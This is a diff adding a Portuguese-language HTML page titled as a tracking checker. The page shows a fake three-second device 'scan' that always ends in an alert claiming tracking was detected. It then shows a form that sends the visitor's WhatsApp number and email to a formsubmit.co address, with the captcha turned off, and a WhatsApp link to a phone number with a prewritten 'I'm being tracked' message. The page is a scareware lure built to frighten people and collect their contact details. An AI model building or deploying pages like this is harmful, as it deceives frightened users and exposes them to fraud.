@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificação de Rastreio</title>
+  <style>
+    body {
+      background-color: #0f1115;
+      color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      padding: 30px;
+    }
+    .container {
+      max-width: 600px;
+      margin: auto;
+      background-color: #1a1a1a;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+    }
+    h1 {
+      color: #00ff99;
+    }
+    .btn, .whatsapp {
+      margin-top: 20px;
+      background-color: #00ff99;
+      color: #000;
+      padding: 12px 25px;
+      text-decoration: none;
+      border-radius: 8px;
+      font-weight: bold;
+      display: inline-block;
+    }
+    #loading, #alerta, #formulario {
+      display: none;
+      margin-top: 20px;
+    }
+    #loading p {
+      color: #00ff99;
+    }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #00ff99;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+      margin-top: 15px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #alerta {
+      background-color: #ff4444;
+      padding: 15px;
+      border-radius: 6px;
+    }
+    input[type="text"], input[type="email"] {
+      padding: 10px;
+      width: 80%;
+      margin-top: 10px;
+      border-radius: 6px;
+      border: none;
+    }
+    input[type="submit"] {
+      background-color: #00ff99;
+      color: #000;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 6px;
+      margin-top: 10px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+  <script>
+    function mostrarCarregando() {
+      document.getElementById('botaoVerificar').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(mostrarAlerta, 3000);
+    }
+    function mostrarAlerta() {
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('alerta').style.display = 'block';
+      document.getElementById('formulario').style.display = 'block';
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h1>🔍 Verificador de rastreamento</h1>
+    <p>Verifique se alguém acessou ou está rastreando seu dispositivo ou perfil social.</p>
+
+    <button id="botaoVerificar" class="btn" onclick="mostrarCarregando()">Iniciar Verificação</button>
+
+    <div id="loading">
+      <p>Verificando seu dispositivo...</p>
+      <div class="spinner"></div>
+    </div>
+
+    <div id="alerta">
+      <h3>⚠️ Atenção:</h3>
+      <p>Detectamos sinais de rastreamento no seu acesso.</p>
+      <p>É recomendado tomar medidas imediatas para proteger sua privacidade.</p>
+    </div>
+
+    <div id="formulario">
+      <form action="https://formsubmit.co/SEUEMAIL@EXEMPLO.COM" method="POST">
+        <p><strong>Receba ajuda imediata:</strong></p>
+        <input type="text" name="telefone" placeholder="Seu número de WhatsApp" required><br>
+        <input type="email" name="email" placeholder="Seu e-mail" required><br>
+        <input type="submit" value="Solicitar ajuda">
+        <input type="hidden" name="_captcha" value="false">
+      </form>
+      <br>
+      <a class="whatsapp" href="https://wa.me/5577988626926?text=Oi%2C+recebi+um+alerta+de+que+estou+sendo+rastreado.+Pode+me+ajudar+a+resolver+isso%3F" target="_blank">
+        🛡️ Falar com analista agora
+      </a>
+    </div>
+  </div>
+</body>
+</html>
